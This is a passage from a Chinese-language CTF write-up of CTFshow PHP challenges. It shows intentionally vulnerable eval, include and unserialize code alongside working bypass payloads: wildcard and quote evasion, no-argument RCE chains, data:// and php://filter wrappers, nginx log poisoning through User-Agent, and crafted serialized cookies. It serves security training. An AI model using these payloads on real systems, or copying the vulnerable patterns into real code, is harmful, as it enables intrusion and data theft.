&#125;</code></pre>

<p>简单的绕过</p>
<p><code>\ &#39;&#39; &quot; &quot; `` </code>都可以绕过，加在flag里就行</p>
<pre><code class="highlight plaintext">?c=system(&quot;cat fla\g.php&quot;);</code></pre>

<p>然后看源码注释掉的部分即可</p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code class="highlight plaintext">命令执行，需要严格的过滤</code></pre>

<p>那看来过滤很不严格了</p>
<pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>懒得看多出来的过滤，和我的通配符说去吧</p>
<pre><code class="highlight plaintext">?c=passthru(&quot;cat fl*&quot;);</code></pre>

<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>三种方法：</p>
<ul>
<li>空格替代</li>
</ul>
<pre><code class="highlight plaintext">?c=echo%09`tac%09fl*`;//这边&#123;IFS&#125;出于未知原因是不可用的</code></pre>

<ul>
<li>eval传参</li>
</ul>
<pre><code class="highlight plaintext">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</code></pre>

<ul>
<li>无参数</li>
</ul>
<pre><code class="highlight plaintext">eval(end(current(get_defined_vars())));&amp;b=system(&#x27;tac fl*&#x27;);
show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>

<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p>这里不看过滤字符串(问就是没必要，还没过滤的很死)</p>
<p>看一眼过滤了</p>
<pre><code class="highlight plaintext">. 空格 &#x27; ` ;  (</code></pre>

<p>括号都过滤掉了吗。哈基c你这家伙，但是不影响</p>
<p>这里放弃直接shell的想法，尝试用伪协议作为帮手</p>
<pre><code class="highlight plaintext">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</code></pre>

<p>为什么这个<code>?&gt;</code>可以用呢?</p>
<p>看其他师傅的解释说是<code>?&gt;</code>可以 闭合 php（ ?&gt; 闭合的是 eval 里面的 php 语句，eval 后续还有语句的话，依旧是会执行的。)</p>
<pre><code class="highlight plaintext">具体的来说，对于include
空格是个可有可无的东西，即使没有空格它也能从上下文中判断 $var 是变量，它会优先解析变量，然后再处理语句。
?&gt;这部分在这里也很神必，eval解析php语句，而后面的?&gt;直接被当作了无效文字不被处理，而在?&gt;前的语句不加;是无所谓的</code></pre>

<p>多说无益，自己调一眼看看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708105538411.png" alt="image-20250708105538411"></p>
<p>可以看到后面的语句正常执行了</p>
<p>php，很神奇吧。。</p>
<pre><code class="highlight plaintext">base64是什么几把，我直接php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php当懒狗爽赤😋</code></pre>



<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( &quot;</code></pre>

<p>双引号也没了</p>
<p>但是我前一个好像没用过””啊。。</p>
<p>秒赤</p>
<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. 空格 ` &#x27; ; ( : &quot;</code></pre>

<p>木大木大木大！没有实质用处的过滤哒!和上上个凑一桌去</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( : &quot; &lt; =</code></pre>

<p>和上上上个一桌</p>
<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( : &quot; &lt; = / 数字</code></pre>

<p>数字换成字母</p>
<p>然后和上上上上个一桌</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code class="highlight plaintext">&lt;?php
//flag in flag.php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>

<p>嗯。。这里直接<code>include</code>了，直接伪协议吧</p>
<pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>

<p>这里base64是<code>&lt;?php system(&#39;tac flag.php&#39;); ?&gt;</code></p>
<p>或者其实都能命令执行了你用<code>*</code>偷个懒也没事</p>
<p>这里为什么<code>php://input</code>用谷歌浏览器的hackbar会出现执行不了的情况(因为这啥比post没有&#x3D;就发不了包)</p>
<p>只有在包手动改才可以</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708121634882.png" alt="image-20250708121634882"></p>
<p>也可以尝试包含一下日志</p>
<pre><code class="highlight plaintext">nginx 的日志文件 /var/log/nginx/access.log</code></pre>

<p>包含完发现记录了UA头，尝试一下UA头注入</p>
<p><code>User-Agent: &lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>
<p>在&#x2F;路由下注入再包含就可以看到被执行</p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="comment">//flag in flag.php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">include</span>(<span class="variable">$c</span>);
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p><del>简直说的和你上一题可以用这file一样</del></p>
<p>咳咳，看到过滤了<code>flag php file</code></p>
<p>考虑用data伪协议</p>
<pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>

<p><code>妈的忘了还有短标签了。</code></p>
<pre><code class="highlight plaintext">?c=data://text/plain,&lt;?=system(&quot;tac fl*&quot;)?&gt;</code></pre>

<p>当然的当然这题用日志包含还是可以做</p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code class="highlight plaintext">&lt;?php
//flag in flag.php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        include($c.&quot;.php&quot;);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>用一个小小的后缀乱我道心吗。。</p>
<pre><code class="highlight plaintext">?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;//
?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;&lt;?php</code></pre>

<p>两种都行，总之闭合把后面的去掉就行</p>
<p>但是其实不去也行，聪明的php会把后面的后缀当成html直接显示</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
        
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p>啊呀！骇死我力</p>
<p>过滤了数字</p>
<pre><code class="highlight plaintext">~ ` @ # $ % ^ &amp; * （ ） - = + &#123; &#125; [ ] : &#x27; &quot; , &lt; . &gt; / ? \</code></pre>

<p>符号基本都用不了了</p>
<p>但是您猜怎么着?哎!他这是个中文输入法的括号</p>
<p>无参数rce伺候</p>
<pre><code class="highlight plaintext">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=session_start();system(session_id());</code></pre>

<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>无数字字母rce</p>
<p><code>~ $</code>不给用，自增取反异或都用不了辣</p>
<p>不异或能怎么办呢。。你看这里是不是还有个<code>|</code>可以用</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>
<span class="class"></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="variable">$u</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="variable">$p</span>) &#123;
            <span class="variable language_">$this</span>-&gt;isVip = <span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isVip) &#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span> . <span class="variable">$flag</span>;
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;
    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
    <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;
        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>()) &#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125; <span class="keyword">else</span> &#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>

<p>就是简单的传。别想歪了(谁想歪了我不说)</p>
<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
        &#125;<span class="keyword">else</span>&#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>

<p>不帮你创，让你自己搞一搞，序列化入门说是</p>
<pre><code class="highlight plaintext">&lt;?php
class ctfShowUser&#123;
    public $username=&#x27;1&#x27;;
    public $password=&#x27;1&#x27;;
    public $isVip=true;
&#125;
$A=new ctfShowUser();
echo serialize($A);</code></pre>

<p>发现传不进去，一查发现<strong>Cookie中将”作为截断符号</strong></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710161829381.png" alt="image-20250710161829381"></p>
<p>感觉分号也不是很友好啊。<code>url编码整一个</code></p>
<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;
                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
              &#125;
        &#125;<span class="keyword">else</span>&#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>

<p>比上一题多了个<code>username!=passwd</code></p>
<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class">&#125;</span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;
<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
&#125;</code></pre>

<p>这里看上部分即可</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class">&#125;</span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
